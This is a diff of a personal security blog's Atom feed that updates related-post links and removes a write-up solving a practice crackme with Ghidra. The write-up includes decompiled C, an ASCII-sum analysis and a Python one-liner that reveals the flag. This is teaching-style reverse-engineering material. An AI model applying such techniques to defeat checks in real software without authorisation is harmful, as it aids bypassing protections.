         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
         &lt;/a&gt;
@@ -903,12 +1259,6 @@ c7(): rax = 0x22
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
-          Creating a Barebones Linux Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1428,6 +1778,12 @@ exploit
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
+          Return Oriented Programming Tutorial
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
         &lt;/a&gt;
@@ -1436,12 +1792,6 @@ exploit
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
-          Creating a Barebones Linux Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1607,113 +1957,10 @@ optional arguments:
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
-          Pentesting GreenOptic: 1
+        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
+          Return Oriented Programming Tutorial
         &lt;/a&gt;
       &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
-          Creating a Barebones Windows Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
-          Creating a Barebones Linux Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-  &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">As someone who loves using Raspberry Pis, I thought that it would be a fun project to setup an ad blocking DNS server on my network using Pi-hole. Pi-hole, for those who do not know, is a DNS server that automatically tries to detect and block domains that have known advertisements. The way that it works is that normally, if your computer encounters a domain name without knowing its IP address, it will send a query to a DNS server, which will tell the computer what the corresponding IP address is (or forward it to another DNS server if it does not know). Pi-hole uses blacklists of domains to make sure that if you send a DNS request to it, it prevent you from accessing those domains.</summary></entry><entry><title type="html">Solving a Basic Crackme Using Ghidra</title><link href="http://localhost:4000/2019/03/11/solving-a-basic-crackme-using-ghidra.html" rel="alternate" type="text/html" title="Solving a Basic Crackme Using Ghidra" /><published>2019-03-11T00:00:00-04:00</published><updated>2019-03-11T00:00:00-04:00</updated><id>http://localhost:4000/2019/03/11/solving-a-basic-crackme-using-ghidra</id><content type="html" xml:base="http://localhost:4000/2019/03/11/solving-a-basic-crackme-using-ghidra.html">&lt;p&gt;Recently, the NSA released a free reverse-engineering tool called &lt;a href=&quot;https://www.nsa.gov/resources/everyone/ghidra/&quot;&gt;Ghidra&lt;/a&gt;. Today, I decided to take a look at it and try to solve a basic crackme using this tool. &lt;a href=&quot;https://crackmes.one/crackme/5c1a939633c5d41e58e005d1&quot;&gt;This&lt;/a&gt; is the link to the crackme that I will be trying to solve today.&lt;/p&gt;
-
-&lt;p&gt;Once I downloaded the crackme file, I ran it and looked at what the program did. Here is its basic output:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enter the magic string
-a
-wrong string
-No flag for you.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enter the magic string
-Some Random Input
-too long...sorry no flag for you!!!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;It looks like it takes some sort of input value, and if that input value is what it expects, then it will print out the flag. If the input value is incorrect or too long, then it will print out a different message. Our goal here is to find out the correct input value.&lt;/p&gt;
-
-&lt;p&gt;I started up Ghidra, created a new project, and added the binary file to my project. You can do this by first clicking File-&amp;gt;New Project, and then dragging and dropping the binary file into the project.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-solving-a-basic-crackme-using-ghidra/ghidra_project.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img style=&quot;float: right&quot; src=&quot;../../../assets/img/2019-solving-a-basic-crackme-using-ghidra/symbol_tree.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;When I opened the file in Ghidra, a pop-up came up in Ghidra asking me if I wanted to analyze the binary now. I hit yes and waited a second before it was done analyzing the file. Then I went to the symbol tree on the left, typed in “main” to find the main function, and clicked on it. This brought me to the main method, and on the other two windows I could see the main method’s assembly and decompiled code.&lt;/p&gt;
-
-&lt;p&gt;Here is the decompiled code. I changed a few of the variable names to make it a little bit more readable. You can do this by right-clicking on the variable and clicking “Rename variable.”&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;undefined8 main(void)
-
-{
-  size_t len;
-  size_t len2;
-  long lVar1;
-  char input [112];
-  int counter;
-  int strValues;
-  
-  strValues = 0;
-  puts(&quot;enter the magic string&quot;);
-  fgets(input,100,stdin);
-  len = strlen(input);
-  if (len &amp;lt; 0xc) {
-    counter = 0;
-    while( true ) {
-      len2 = strlen(input);
-      if (len2 &amp;lt;= (ulong)(long)counter) break;
-      strValues = strValues + (int)input[(long)counter];
-      counter = counter + 1;
-    }
-    if (strValues == 1000) {
-      lVar1 = strcat_str();
-      printf(&quot;flag is flag{&quot;);
-      counter = 0;
-      while (counter &amp;lt; 10) {
-        putchar((int)*(char *)(lVar1 + (long)counter));
-        counter = counter + 1;
-      }
-      puts(&quot;}&quot;);
-    }
-    else {
-      puts(&quot;wrong string\nNo flag for you.&quot;);
-    }
-  }
-  else {
-    puts(&quot;too long...sorry no flag for you!!!&quot;);
-  }
-  return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The first thing that the code does is print out “enter the magic string” and reads in the value that you typed in into a variable that I named “input”. It also calculates the length of this input variable and makes sure that it is less than 12 (which makes it a maximum of ten characters plus a newline character). After that, there is a loop that adds up all of the ascii values of each character of the input into an integer that I named “strValues”. Then, finally, it prints out the flag if the total values of all the added ascii values equals 1000.&lt;/p&gt;
-
-&lt;p&gt;Since I knew that I could type in a maximum of ten characters, the first thing I tried to do was to divide 1000 by 10 to figure out the ascii value of the characters that I needed to type in ten times. Since 1000/10 = 100, and ‘d’ is 100 in ascii, I decided to type in ‘d’ ten times and see what happened.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c &quot;print('d' * 10)&quot; | ./rev30
-enter the magic string
-wrong string
-No flag for you.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Unforunately, this did not work. At first I didn’t understand why this didn’t work, but then I realized that I forgot to take into account the fact that the while loop was also adding up the value of the newline character, which had an ascii value of 10. This meant that instead of doing 1000/10 to figure out the ascii value of the character I had to type in 10 times, I had to do (1000-10)/10 to take this into account. This gave me a value of 99, or ‘c’ in ascii. I tried to use ‘c’ ten times, and lo and behold:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c &quot;print('c' * 10)&quot; | ./rev03 
-enter the magic string
-flag is flag{!#&amp;amp;*/5&amp;lt;DMW}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Thanks for reading this writeup. I hope you enjoyed it.&lt;/p&gt;
-
-&lt;section class=&quot;related&quot;&gt;
-  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
-  &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
@@ -1727,11 +1974,5 @@ flag is flag{!#&amp;amp;*/5&amp;lt;DMW}
         &lt;/a&gt;
       &lt;/li&gt;
     
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
-          Creating a Barebones Linux Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
   &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">Recently, the NSA released a free reverse-engineering tool called Ghidra. Today, I decided to take a look at it and try to solve a basic crackme using this tool. This is the link to the crackme that I will be trying to solve today.</summary></entry></feed>
+&lt;/section&gt;</content><author><name></name></author><summary type="html">As someone who loves using Raspberry Pis, I thought that it would be a fun project to setup an ad blocking DNS server on my network using Pi-hole. Pi-hole, for those who do not know, is a DNS server that automatically tries to detect and block domains that have known advertisements. The way that it works is that normally, if your computer encounters a domain name without knowing its IP address, it will send a query to a DNS server, which will tell the computer what the corresponding IP address is (or forward it to another DNS server if it does not know). Pi-hole uses blacklists of domains to make sure that if you send a DNS request to it, it prevent you from accessing those domains.</summary></entry></feed>
